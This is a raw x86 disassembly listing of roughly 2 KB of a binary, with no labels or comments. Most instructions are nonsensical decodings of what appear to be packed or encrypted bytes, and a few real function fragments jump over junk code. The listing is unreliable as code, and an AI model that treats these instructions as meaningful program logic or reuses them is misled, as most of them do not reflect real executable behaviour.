  403a88:	sbb    edx,DWORD PTR [ebx-0x290cc2b2]
  403a8e:	data16 aas 
  403a90:	hlt    
  403a91:	push   cs
  403a92:	fldenv [edx+edi*8+0x44]
  403a96:	sub    BYTE PTR [eax+0xe4bc1d5],bl
  403a9c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  403a9e:	push   ecx
  403a9f:	mov    ebp,0x7d76673b
  403aa4:	or     bl,cl
  403aa6:	sub    BYTE PTR [ecx],bl
  403aa8:	daa    
  403aa9:	rcr    DWORD PTR [edi],1
  403aab:	mov    dl,0x97
  403aad:	push   edx
  403aae:	sbb    al,0x2f
  403ab0:	push   esp
  403ab1:	shl    ebx,cl
  403ab3:	inc    ebp
  403ab4:	aam    0x22
  403ab6:	jmp    0x814b:0xaf96399f
  403abd:	ret    0x32c4
  403ac0:	pop    ecx
  403ac1:	jnp    0x403a85
  403ac3:	xchg   ecx,eax
  403ac4:	and    BYTE PTR [edx-0x1e901671],ch
  403aca:	xchg   ebp,eax
  403acb:	(bad)  
  403acc:	xchg   ecx,eax
  403acd:	add    DWORD PTR [eax-0x35],0xffffff86
  403ad1:	out    dx,al
  403ad2:	inc    ecx
  403ad3:	test   DWORD PTR [edi],0x885eb86a
  403ad9:	ss (bad) 
  403adb:	retf   0x1837
  403ade:	or     ecx,0xffffffe1
  403ae1:	in     al,0x54
  403ae3:	dec    ebp
  403ae4:	rcl    DWORD PTR [ecx+0x43d03212],cl
  403aea:	sbb    BYTE PTR [esi+0x48],bl
  403aed:	and    BYTE PTR [edi],al
  403aef:	push   esp
  403af0:	ins    DWORD PTR es:[edi],dx
  403af1:	xchg   BYTE PTR [esi+0x78],dh
  403af4:	icebp  
  403af5:	cld    
  403af6:	out    0x60,eax
  403af8:	aaa    
  403af9:	stos   BYTE PTR es:[edi],al
  403afa:	jb     0x403afa
  403afc:	fstp   QWORD PTR [ecx-0x4839dfb5]
  403b02:	rcl    BYTE PTR [ecx-0x3a80b3c2],1
  403b08:	cmp    eax,0x65bb4d2f
  403b0d:	aas    
  403b0e:	cmp    eax,0x451a9e3a
  403b13:	mov    ebx,0x84df4f6e
  403b18:	fldcw  WORD PTR [esi+0x28]
  403b1b:	mov    ecx,0xf8672d71
  403b20:	mov    ebx,0xf40690ab
  403b25:	mov    ds:0x75624cfa,eax
  403b2a:	inc    esi
  403b2b:	mov    eax,DWORD PTR [esi-0x64acf059]
  403b31:	sbb    eax,0x8e79c734
  403b36:	ret    0x9baa
  403b39:	cmp    bl,BYTE PTR [esi]
  403b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b3c:	mov    ds:0xa68d83ab,al
  403b41:	mov    dh,0xa2
  403b43:	dec    ebp
  403b44:	sbb    eax,DWORD PTR [edx+0x72d1ead1]
  403b4a:	rol    BYTE PTR [edx+0x5d],cl
  403b4d:	fistp  QWORD PTR [edi+0x8577d94]
  403b53:	and    al,0x6e
  403b55:	int3   
  403b56:	std    
  403b57:	or     DWORD PTR [ecx],edx
  403b59:	jle    0x403b27
  403b5b:	les    ebp,FWORD PTR [edi+ebp*2-0x2e6e70e4]
  403b62:	aas    
  403b63:	int    0x82
  403b65:	rol    BYTE PTR [ebx],1
  403b67:	call   0xa6e3:0x38bb9a38
  403b6e:	xchg   esp,eax
  403b6f:	lahf   
  403b70:	push   eax
  403b71:	jmp    0x5a5dc42
  403b76:	pop    ebx
  403b77:	arpl   WORD PTR [esi+0x59],ax
  403b7a:	mov    al,0x9f
  403b7c:	sub    DWORD PTR [edi],ecx
  403b7e:	daa    
  403b7f:	fcom   st(0)
  403b81:	mov    DWORD PTR [edi],ecx
  403b83:	mov    edx,0xeff5af05
  403b88:	pop    esp
  403b89:	push   ecx
  403b8a:	or     bl,dh
  403b8c:	(bad)  
  403b8d:	sbb    eax,0xc9e6e562
  403b92:	jns    0x403b50
  403b94:	jo     0x403ba0
  403b96:	aaa    
  403b97:	shl    BYTE PTR [eax-0x35980a8d],cl
  403b9d:	mov    al,0x2b
  403b9f:	xchg   BYTE PTR [eax],ch
  403ba1:	into   
  403ba2:	fs leave 
  403ba4:	int3   
  403ba5:	sbb    edi,esp
  403ba7:	(bad)  
  403ba8:	xor    dh,BYTE PTR [ebx]
  403baa:	arpl   sp,dx
  403bac:	dec    eax
  403bad:	cmp    al,0x6f
  403baf:	jb     0x403bbd
  403bb1:	push   cs
  403bb2:	call   0x68ff:0xad19c607
  403bb9:	xchg   edx,eax
  403bba:	sub    ecx,DWORD PTR [esp+ebx*4]
  403bbd:	push   esp
  403bbe:	mov    edx,0x8ba83337
  403bc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bc4:	ror    eax,cl
  403bc6:	ds cdq 
  403bc8:	aaa    
  403bc9:	pop    edx
  403bca:	call   0x826c:0xb8894697
  403bd1:	stos   DWORD PTR es:[edi],eax
  403bd2:	ficomp WORD PTR [ebx]
  403bd4:	pop    ebp
  403bd5:	sbb    ah,BYTE PTR [edx*4+0x228447d6]
  403bdc:	or     al,0xdf
  403bde:	push   edi
  403bdf:	mov    ebp,0x2033f330
  403be4:	sub    eax,0x5bd8d741
  403be9:	mov    dl,0xf2
  403beb:	out    dx,eax
  403bec:	dec    edi
  403bed:	sbb    esi,0xa2609f67
  403bf3:	cli    
  403bf4:	xchg   edi,esp
  403bf6:	sbb    bl,al
  403bf8:	xor    esp,edi
  403bfa:	inc    DWORD PTR [edi-0x2b]
  403bfd:	jo     0x403c3d
  403bff:	ror    bh,1
  403c01:	jae    0x403bb5
  403c03:	xor    BYTE PTR [ecx],bl
  403c05:	mov    dh,0x3d
  403c07:	or     al,0xab
  403c09:	inc    ebx
  403c0a:	je     0x4041a7
  403c10:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0x49dcf48b
  403c29:	pop    ecx
  403c2a:	xchg   ecx,eax
  403c2b:	add    DWORD PTR [edx+0x1e],eax
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403c4d
  403c35:	fadd   DWORD PTR ds:0x4d1d89d8
  403c3b:	adc    eax,0x8858c100
  403c40:	sbb    al,0xcf
  403c42:	test   al,0xae
  403c44:	xor    al,0x81
  403c46:	xchg   ebp,eax
  403c47:	ins    BYTE PTR es:[edi],dx
  403c48:	jge    0x403c05
  403c4a:	repz and dl,BYTE PTR [eax-0x376638d8]
  403c51:	and    BYTE PTR [edi+0x3],0xb0
  403c55:	pop    es
  403c56:	imul   ebx,esp,0x3550ef91
  403c5c:	in     eax,0x5
  403c5e:	nop    ecx
  403c61:	pop    ss
  403c62:	add    ebx,DWORD PTR [edi]
  403c64:	loope  0x403c7d
  403c66:	cld    
  403c67:	sub    bh,BYTE PTR [edi-0x76ab74dd]
  403c6d:	jno    0x403c9c
  403c6f:	and    BYTE PTR [ecx],bh
  403c71:	stc    
  403c72:	jecxz  0x403c84
  403c74:	outs   dx,DWORD PTR ds:[esi]
  403c75:	adc    DWORD PTR [ebx+0x37],esi
  403c78:	pop    es
  403c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c7a:	lods   al,BYTE PTR ds:[esi]
  403c7b:	ret    0xb653
  403c7e:	inc    esi
  403c7f:	(bad)  
  403c80:	loopne 0x403c6a
  403c82:	xchg   ebx,eax
  403c83:	sahf   
  403c84:	aam    0x38
  403c86:	int    0x52
  403c88:	imul   edx,DWORD PTR [edi+0x4cf5e550],0x1e
  403c8f:	repnz sbb bh,BYTE PTR [ecx]
  403c92:	sbb    al,0x36
  403c94:	retf   
  403c95:	jbe    0x403c69
  403c97:	inc    DWORD PTR [ebx]
  403c99:	add    ebp,DWORD PTR [eax-0x34a20cf9]
  403c9f:	das    
  403ca0:	je     0x403d20
  403ca2:	dec    edx
  403ca3:	inc    ebx
  403ca4:	test   DWORD PTR [ecx-0x6],ecx
  403ca7:	and    ebp,DWORD PTR [ebp+0x6dfeb1bd]
  403cad:	adc    edi,DWORD PTR [ebx]
  403caf:	sbb    ebx,ebx
  403cb1:	push   cs
  403cb2:	sub    bl,BYTE PTR [eax]
  403cb4:	sbb    al,dh
  403cb6:	sub    BYTE PTR [edx],cl
  403cb8:	lods   eax,DWORD PTR ds:[esi]
  403cb9:	mov    ds:0x8c6f8dc1,eax
  403cbe:	push   esi
  403cbf:	push   0xd22a5ec2
  403cc4:	ins    BYTE PTR es:[edi],dx
  403cc5:	dec    ebx
  403cc6:	in     eax,0x12
  403cc8:	and    eax,0xbc8d9e3f
  403ccd:	jb     0x403d0a
  403ccf:	add    cl,BYTE PTR [edi-0x21]
  403cd2:	stc    
  403cd3:	mov    ?,ecx
  403cd5:	sti    
  403cd6:	sbb    BYTE PTR [ecx],ch
  403cd8:	test   edi,edi
  403cda:	inc    eax
  403cdb:	imul   esp,ebp,0xffffffc2
  403cde:	out    dx,eax
  403cdf:	ss das 
  403ce1:	popa   
  403ce2:	jbe    0x403c97
  403ce4:	addr16 mov al,ds:0x8b10
  403ce8:	mov    ds:0x3f7efa56,eax
  403ced:	outs   dx,DWORD PTR ds:[esi]
  403cee:	mov    cl,0xc2
  403cf0:	test   al,0x26
  403cf2:	int3   
  403cf3:	ins    BYTE PTR es:[edi],dx
  403cf4:	mov    esi,0x53feb101
  403cf9:	cmp    al,0x9a
  403cfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cfc:	cmp    BYTE PTR [ecx-0x18],bl
  403cff:	or     BYTE PTR [edi],ah
  403d01:	cmp    eax,0x7d44b3a
  403d06:	in     al,0x12
  403d08:	mov    WORD PTR [edi-0x5e],cs
  403d0b:	mov    eax,ds:0xda0eedbc
  403d10:	imul   edx,DWORD PTR [edi-0x6d956ae6],0x2d5cfe75
  403d1a:	push   esi
  403d1b:	lods   eax,DWORD PTR ds:[esi]
  403d1c:	aad    0x38
  403d1e:	fmul   DWORD PTR [ebp+0xd]
  403d21:	jp     0x403cf2
  403d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d24:	mov    ds:0xc1ada9c5,eax
  403d29:	dec    edx
  403d2a:	jnp    0x403d05
  403d2c:	fist   WORD PTR [esi-0x53]
  403d2f:	pop    ss
  403d30:	call   0xc77c:0x3a9e5b4f
  403d37:	or     DWORD PTR [esi],esp
  403d39:	pop    edi
  403d3a:	dec    edi
  403d3b:	jg     0x403d46
  403d3d:	mov    dl,0xdd
  403d3f:	and    ebx,DWORD PTR [ebx+0x7e]
  403d42:	pop    ds
  403d43:	sub    esi,DWORD PTR [ebp+0x5ecfba1c]
  403d49:	and    edi,ecx
  403d4b:	pusha  
  403d4c:	repz adc al,BYTE PTR [ecx]
  403d4f:	push   ss
  403d50:	fcomp  QWORD PTR [esi+ebx*2-0x2022e8fa]
  403d57:	add    dl,BYTE PTR [esi+0x1d7ee905]
  403d5d:	inc    ecx
  403d5e:	sub    BYTE PTR ds:0xb35b5efa,ch
  403d64:	ret    0x5acf
  403d67:	cmp    eax,0xee6ef04f
  403d6c:	add    ecx,DWORD PTR [edi+0x74d8b360]
  403d72:	test   DWORD PTR [ebx+0x33],esi
  403d75:	pushf  
  403d76:	lods   eax,DWORD PTR ds:[esi]
  403d77:	cmp    al,0x72
  403d79:	(bad)  
  403d7a:	sub    eax,ebp
  403d7c:	fcmovne st,st(6)
  403d7e:	sbb    dl,0xd
  403d81:	xchg   edx,eax
  403d82:	mov    al,0xac
  403d84:	mov    eax,ds:0x58da3a79
  403d89:	mov    ch,0xa6
  403d8b:	mov    ebx,0x68e7bda2
  403d90:	dec    esp
  403d91:	sub    dl,BYTE PTR [ecx]
  403d93:	mov    ds:0xed2067c0,eax
  403d98:	push   esp
  403d99:	sbb    al,0xf2
  403d9b:	repnz not DWORD PTR [edi+0x23e107c2]
  403da2:	push   0xffffffa5
  403da4:	out    0xf8,eax
  403da6:	imul   esi,DWORD PTR [edi+edx*8+0x10],0x8b257e37
  403dae:	ret    0xc5ac
  403db1:	mov    esp,0xf87d4b1f
  403db6:	ror    BYTE PTR [edi],cl
  403db8:	sub    bl,BYTE PTR [edx-0x4]
  403dbb:	bound  ecx,QWORD PTR [edi-0x9109a67]
  403dc1:	lock leave 
  403dc3:	xor    al,0xcf
  403dc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dc6:	add    BYTE PTR [esp+esi*4+0x3ef6895b],cl
  403dcd:	cs jae 0x403d97
  403dd0:	push   edi
  403dd1:	iret   
  403dd2:	inc    ecx
  403dd3:	mov    al,0x47
  403dd5:	das    
  403dd6:	sbb    BYTE PTR [edi+edx*1-0x552332e3],dl
  403ddd:	xchg   ecx,ebp
  403ddf:	iret   
  403de0:	inc    ebp
  403de1:	call   0x45cdb448
  403de6:	call   0x8c2c8374
  403deb:	inc    ebp
  403dec:	in     al,dx
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi+0x70fe286b],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403dd7
  403e11:	out    0x4e,al
  403e13:	sub    cl,BYTE PTR [esi]
  403e15:	fcom   DWORD PTR [ecx]
  403e17:	sar    BYTE PTR ds:0xeec6fc20,1
  403e1d:	iret   
  403e1e:	xchg   ebx,eax
  403e1f:	lods   al,BYTE PTR ds:[esi]
  403e20:	and    edi,esp
  403e22:	pop    edx
  403e23:	aas    
  403e24:	nop
  403e25:	push   ebx
  403e26:	(bad)  
  403e27:	jmp    FWORD PTR [ebx-0x66dc02ca]
  403e2d:	adc    DWORD PTR [ecx-0x591e22c],ebx
  403e33:	leave  
  403e34:	bound  ebx,QWORD PTR [ebp+0x36]
  403e37:	sbb    BYTE PTR [edx+0xccf4e00],0x2c
  403e3e:	mov    BYTE PTR [edi+0x2c],0x6d
  403e42:	sbb    edi,DWORD PTR [esi+0x12]
  403e45:	and    ah,BYTE PTR [edx-0x51]
  403e48:	test   eax,0xafbe9919
  403e4d:	aad    0x8b
  403e4f:	(bad)  
  403e50:	push   ds
  403e51:	dec    esi
  403e52:	jmp    0x5a62:0x767e2d62
  403e59:	sbb    eax,0xc3f5f08a
  403e5e:	jg     0x403de1
  403e60:	data16 cmp BYTE PTR [ecx+edi*2+0x1a],cl
  403e65:	mov    BYTE PTR [esi+0x43d1a8d0],bl
  403e6b:	ins    DWORD PTR es:[edi],dx
  403e6c:	pop    eax
  403e6d:	dec    ebx
  403e6e:	xor    BYTE PTR [eax],ah
  403e70:	lds    ecx,FWORD PTR [ecx]
  403e72:	(bad)  
  403e73:	mov    dh,0x24
  403e75:	enter  0xdc0f,0xb1
  403e79:	add    eax,0xf1c76305
  403e7e:	adc    BYTE PTR [eax-0x786ee928],bh
  403e84:	jge    0x403e17
  403e86:	push   0x1d3ad699
  403e8b:	push   ebp
  403e8c:	mov    edx,0x79763035
  403e91:	lea    edx,[edx+0x67]
  403e94:	sar    DWORD PTR es:[eax+0x36],1
  403e98:	sub    esi,esp
  403e9a:	outs   dx,DWORD PTR ds:[esi]
  403e9b:	enter  0xf14c,0x82
  403e9f:	add    ebx,DWORD PTR [ebx]
  403ea1:	mov    esi,DWORD PTR [edi-0x4c]
  403ea4:	out    dx,eax
  403ea5:	lds    eax,FWORD PTR [edx+0x7]
  403ea8:	stos   DWORD PTR es:[edi],eax
  403ea9:	mov    al,0x2f
  403eab:	push   ebp
  403eac:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  403eae:	xchg   bl,bl
  403eb0:	stc    
  403eb1:	mov    ebx,0x45bba07e
  403eb6:	test   al,0x2a
  403eb8:	loope  0x403e94
  403eba:	sbb    edi,DWORD PTR [edx*8+0x546e6384]
  403ec1:	bound  esp,QWORD PTR [edi+edi*2]
  403ec4:	dec    esp
  403ec5:	mov    al,0x1e
  403ec7:	daa    
  403ec8:	fmul   DWORD PTR [esi+0x29541fbb]
  403ece:	nop
  403ecf:	mov    ds:0xee4f90a3,al
  403ed4:	push   esi
  403ed5:	cdq    
  403ed6:	adc    ch,BYTE PTR [edx]
  403ed8:	mov    ds:0xa66603ee,al
  403edd:	(bad)
  403ee1:	inc    esi
  403ee2:	out    0xec,eax
  403ee4:	hlt    
  403ee5:	scas   eax,DWORD PTR es:[edi]
  403ee6:	out    0xef,eax
  403ee8:	adc    edi,DWORD PTR ds:0x3177f06c
  403eee:	arpl   WORD PTR [ecx-0x3755d135],si
  403ef4:	mov    al,0x5c
  403ef6:	retf   
  403ef7:	in     eax,dx
  403ef8:	popf   
  403ef9:	dec    edx
  403efa:	das    
  403efb:	mov    cl,0x26
  403efd:	mov    ah,0xfc
  403eff:	iret   
  403f00:	test   DWORD PTR [edi],esp
  403f02:	xchg   ebp,eax
  403f03:	ret    
  403f04:	xchg   ebp,eax
  403f05:	add    BYTE PTR [edx+0x27e53fdf],al
  403f0b:	add    DWORD PTR ds:0x684399d7,esp
  403f11:	adc    BYTE PTR [esi],0x10
  403f14:	pop    esp
  403f15:	jmp    0x403f2b
  403f17:	in     al,dx
  403f18:	pop    eax
  403f19:	loope  0x403f6e
  403f1b:	test   eax,0xe9ed235b
  403f20:	push   0xffffff88
  403f22:	mov    bl,0x36
  403f24:	inc    ebx
  403f25:	add    ebx,DWORD PTR [edx+edi*8]
  403f28:	das    
  403f29:	mov    ecx,0xe948bd3c
  403f2e:	pop    eax
  403f2f:	test   al,0x83
  403f31:	jb     0x403f8d
  403f33:	sbb    BYTE PTR [ecx-0x18],0x57
  403f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f38:	jne    0x403efe
  403f3a:	jno    0x403f57
  403f3c:	dec    edi
  403f3d:	mov    edx,0x90761940
  403f42:	out    dx,eax
  403f43:	inc    ebp
  403f44:	sahf   
  403f45:	sbb    BYTE PTR [esi],al
  403f47:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  403f49:	test   eax,0x71332f28
  403f4e:	adc    esp,ecx
  403f50:	or     eax,esp
  403f52:	push   edx
  403f53:	out    0x2a,al
  403f55:	mov    ebx,0x3cda8ef4
  403f5a:	scas   al,BYTE PTR es:[edi]
  403f5b:	retf   0xd671
  403f5e:	mov    ch,0x9e
  403f60:	and    bl,ah
  403f62:	xchg   ebx,eax
  403f63:	imul   esi,eax,0x73
  403f66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f67:	pop    es
  403f68:	dec    edx
  403f69:	std    
  403f6a:	not    BYTE PTR [edx+ebp*8+0x60]
  403f6e:	inc    ebp
  403f6f:	fist   DWORD PTR [edx-0x52]
  403f72:	rcl    BYTE PTR [eax+edi*1-0x5a8acbf0],cl
  403f79:	gs xchg ecx,eax
  403f7b:	push   eax
  403f7c:	std    
  403f7d:	add    DWORD PTR [edi-0x7e],ecx
  403f80:	xor    eax,0xd5eec368
  403f85:	sbb    bh,al
  403f87:	mov    ebp,0xa7d02e1c
  403f8c:	jno    0x403fee
  403f8e:	call   0x6ed429ba
  403f93:	and    eax,0xecbd6b6d
  403f98:	sub    al,0x96
  403f9a:	cmp    eax,0xaca10b40
  403f9f:	push   0xffffffb3
  403fa1:	rcl    bh,cl
  403fa3:	ja     0x403f70
  403fa5:	fwait
  403fa6:	xchg   edi,eax
  403fa7:	dec    ecx
  403fa8:	dec    ebx
  403fa9:	sar    ecx,1
  403fab:	add    eax,0xf26b0902
  403fb0:	call   0x1a74:0x47c71d50
  403fb7:	adc    BYTE PTR [ebx+eiz*4+0x8ef232c],ah
  403fbe:	and    cl,BYTE PTR [ecx-0x740fba75]
  403fc4:	push   ebp
  403fc5:	or     BYTE PTR [ebx],dh
  403fc7:	shr    ecx,0xc8
  403fca:	add    DWORD PTR [eax],eax
  403fcc:	add    BYTE PTR [edi+0x2c],bl
  403fcf:	lahf   
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	jae    0x403fbf
  403fdb:	jmp    0x7e5a6224
  403fe0:	jle    0x403f90
  403fe2:	jg     0x404062
  403fe4:	jle    0x403f70
  403fe6:	shl    DWORD PTR [esi+0x43],cl
  403fe9:	mov    dl,0xaf
  403feb:	daa    
  403fec:	lods   al,BYTE PTR ds:[esi]
  403fed:	popf   
  403fee:	cld    
  403fef:	into   
  403ff0:	jmp    0x9ab3:0x558657cf
  403ff7:	push   edi
  403ff8:	adc    DWORD PTR [edi*4-0x2680ca0d],ebx
  403fff:	repz xor al,0x17
  404002:	xchg   BYTE PTR [esi-0x4a],dl
  404005:	lock mov ch,0x87
  404008:	xchg   ecx,eax
  404009:	std    
  40400a:	por    mm7,mm5
  40400d:	mov    dl,0x98
  40400f:	shr    BYTE PTR [ebx+0x77ee9ae1],0xa1
  404016:	mov    eax,0xfb6d9ab4
  40401b:	jmp    0x404049
  40401d:	cmp    eax,0xb4449ae2
  404022:	sub    DWORD PTR [edi+0x4e4811ca],0xfffffff2
  404029:	or     BYTE PTR [edi+0x2c],dl
  40402c:	push   ebp
  40402d:	dec    esp
  40402e:	jmp    0x403fd7
  404030:	sbb    ebx,ebx
  404032:	xchg   ebp,eax
  404033:	sbb    BYTE PTR [ebx+eiz*4],dl
  404036:	sbb    eax,0x49db644b
  40403b:	imul   esp,DWORD PTR [ebx+0x62],0x13
  40403f:	sar    BYTE PTR [eax-0x60],cl
  404042:	jne    0x4040b2
  404044:	jno    0x404095
  404046:	adc    BYTE PTR [ecx-0x60],0x3f
  40404a:	adc    ch,0xdd
  40404d:	cmp    ebp,DWORD PTR [edx]
  40404f:	fdivr  st,st(2)
  404051:	sbb    al,BYTE PTR [edi+0x35]
  404054:	sub    eax,0xa4fcd3f6
  404059:	cwde   
  40405a:	nop
  40405b:	sti    
  40405c:	cmp    ebp,DWORD PTR [ecx]
  40405e:	cwde   
  40405f:	pop    ebp
  404060:	add    al,0xb6
  404062:	mov    dl,0x81
  404064:	fisttp QWORD PTR [edx-0x2febdc0e]
  40406a:	sub    al,0x6d
  40406c:	clc    
  40406d:	push   esi
  40406e:	nop
  40406f:	sti    
  404070:	inc    ebx
  404071:	(bad)  
  404072:	inc    edi
  404073:	sbb    eax,0x3ae5b152
  404078:	push   ecx
  404079:	and    bh,bh
  40407b:	jmp    0x99d56bd4
  404080:	jbe    0x4040ef
  404082:	or     eax,0xbe19b7bd
  404087:	popa   
  404088:	sub    DWORD PTR [eax+esi*2-0x4f],esi
  40408c:	and    cl,bl
  40408e:	jbe    0x404060
  404090:	popf   
  404091:	loopne 0x404019
  404093:	mov    ds:0xe51e2a3c,eax
  404098:	sbb    esi,0x689c64a2
  40409e:	aaa    
  40409f:	sbb    BYTE PTR ds:0x238c0bc,0xcf
  4040a6:	mov    ah,0x9
  4040a8:	jnp    0x4040f4
  4040aa:	ret    
  4040ab:	popf   
  4040ac:	inc    edx
  4040ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040ae:	mov    ds:0xff4b2901,eax
  4040b3:	fidivr DWORD PTR [edi]
  4040b5:	dec    ebp
  4040b6:	imul   esp,DWORD PTR [eax+edx*4+0x1e],0x853faab
  4040be:	push   0x4e
  4040c0:	pop    edx
  4040c1:	sti    
  4040c2:	cwde   
  4040c3:	jbe    0x40412e
  4040c5:	mov    bh,0x87
  4040c7:	rcr    si,1
  4040ca:	add    BYTE PTR [ebx+0x5be45ee3],ch
  4040d0:	gs and edi,eax
  4040d3:	dec    ecx
  4040d4:	rcr    DWORD PTR [ebp+0x24fbe335],0xb7
  4040db:	mov    ds:0xdab1837d,al
  4040e0:	dec    ecx
  4040e1:	jmp    0x5bc1c79c
  4040e6:	pop    edi
  4040e7:	and    al,0x27
  4040e9:	ror    dl,0xe5
  4040ec:	mov    al,ds:0x3b559233
  4040f1:	dec    ecx
  4040f2:	mov    ebp,0x1705174d
  4040f7:	inc    edx
  4040f8:	ror    dh,cl
  4040fa:	cdq    
  4040fb:	loope  0x404118
  4040fd:	arpl   cx,bp
  4040ff:	or     al,0x6f
  404101:	adc    eax,0x23c0cb9c
  404106:	call   0x354f:0xcbcbba9e
  40410d:	ret    
  40410e:	adc    DWORD PTR [ecx+eax*8-0x276d2766],eax
  404115:	lahf   
  404116:	jmp    0x40413e
  404118:	or     eax,0x4fef12a
  40411d:	and    al,0xac
  40411f:	and    DWORD PTR [edx],0x909587b3
  404125:	push   0x767be67e
  40412a:	mov    ds:0x222ce2e3,al
  40412f:	pop    ecx
  404130:	jmp    0x40414b
  404132:	das    
  404133:	dec    ebp
  404134:	loopne 0x4040b7
  404136:	lea    esp,ds:0x2b20156f
  40413c:	cli    
  40413d:	push   edx
  40413e:	sbb    edx,DWORD PTR [edi-0x188a1724]
  404144:	push   es
  404145:	aas    
  404146:	icebp  
  404147:	push   edx
  404148:	int    0xfe
  40414a:	xchg   BYTE PTR [edi],cl
  40414c:	sbb    eax,0xd82b0f9b
  404151:	push   ds
  404152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404153:	fdivr  QWORD PTR [ebx]
  404155:	pop    edx
  404156:	mul    dl
  404158:	cwde   
  404159:	inc    ebp
  40415a:	pop    ebp
  40415b:	xchg   ebx,eax
  40415c:	(bad)  
  40415d:	stc    
  40415e:	hlt    
  40415f:	in     eax,0xe3
  404161:	ds (bad) 
  404164:	in     eax,0x1d
  404166:	ret    0xc3b4
  404169:	mov    ecx,ss
  40416b:	xchg   ebx,eax
  40416c:	aad    0xf9
  40416e:	fcmove st,st(2)
  404170:	retf   
  404171:	push   ebx
  404172:	add    DWORD PTR [ecx+ebp*4-0x18],ebx
  404176:	fyl2xp1 
  404178:	mov    ebx,0xacc76c8b
  40417d:	sbb    al,0x1e
  40417f:	xchg   DWORD PTR [edi-0x2490657b],edx
  404185:	cmc    
  404186:	jno    0x404158
  404188:	mov    ebp,0x93935121
  40418d:	fucom  st(6)
  40418f:	fadd   DWORD PTR [ebp-0x27d14712]
  404195:	lea    eax,[eax+edx*1+0x32729b]
  40419c:	mov    DWORD PTR [ebp+0x8],eax
  40419f:	inc    DWORD PTR [ebp+0xc]
  4041a2:	jmp    0x403a0a
  4041a7:	mov    eax,DWORD PTR [ebp-0x10]
  4041aa:	xor    eax,ecx
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	xlat   BYTE PTR ds:[ebx]
  4041d6:	fstp   QWORD PTR [esi+eax*8]
  4041d9:	push   edx
  4041da:	sbb    edi,DWORD PTR [esi+0x7e]
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x4041d5
  4041e2:	out    0xe3,al
  4041e4:	outs   dx,BYTE PTR ds:[esi]
  4041e5:	inc    ebp
  4041e6:	pop    ebp
  4041e7:	sub    eax,0xd517b570
  4041ec:	aad    0x30
  4041ee:	jmp    0x404231
  4041f0:	shl    BYTE PTR [ecx+0x480a0c27],1
  4041f6:	js     0x4041b0
  4041f8:	and    al,0x9d
  4041fa:	cmp    BYTE PTR [edx],al
  4041fc:	mov    ebp,0x60461aa9
  404201:	hlt    
  404202:	adc    eax,0x798f04b0
  404207:	repz xchg ebp,eax
  404209:	lock aas 
  40420b:	les    ebx,FWORD PTR [edx]
  40420d:	scas   eax,DWORD PTR es:[edi]
  40420e:	sbb    esi,DWORD PTR [edi+0x131ba13b]
  404214:	mov    cl,0x97
  404216:	pop    esp
  404217:	push   ecx
  404218:	scas   al,BYTE PTR es:[edi]
  404219:	dec    eax
  40421a:	lea    esi,fs:[ebp-0x52d2ee2d]
  404221:	mov    al,0xbc
  404223:	adc    eax,0xb18cd66
  404228:	fst    DWORD PTR [edx-0x8]
  40422b:	hlt    
  40422c:	pop    eax
  40422d:	pop    ebx
  40422e:	lahf   
  40422f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404230:	jae    0x4042ae
  404232:	push   edx
  404233:	ss sub eax,edx
  404236:	jl     0x4042b1
  404238:	xor    esp,DWORD PTR [ecx-0x75]
  40423b:	adc    DWORD PTR [ecx-0x4f],ecx
  40423e:	mov    edx,0xec879831
  404243:	adc    ecx,edx
  404245:	lahf   
  404246:	pop    edx
  404247:	rol    DWORD PTR [esi],1
  404249:	mov    ds:0x94e0104f,eax
  40424e:	icebp  
  40424f:	je     0x4041e1
  404251:	cdq    
  404252:	mov    al,0x99
  404254:	sbb    BYTE PTR [ecx-0x6a],ah
  404257:	xchg   BYTE PTR [ebx-0x1e],al
  40425a:	icebp  
  40425b:	sub    ah,BYTE PTR [edx+0x28]
  40425e:	clc    
  40425f:	dec    ecx
  404260:	sar    DWORD PTR [eax],0xf9
  404263:	pop    ds
  404264:	icebp  
  404265:	out    dx,eax
  404266:	mov    al,ds:0xbc679e2c
  40426b:	push   esi
  40426c:	pop    eax
  40426d:	bound  ebx,QWORD PTR [esi]
  40426f:	and    cl,bh
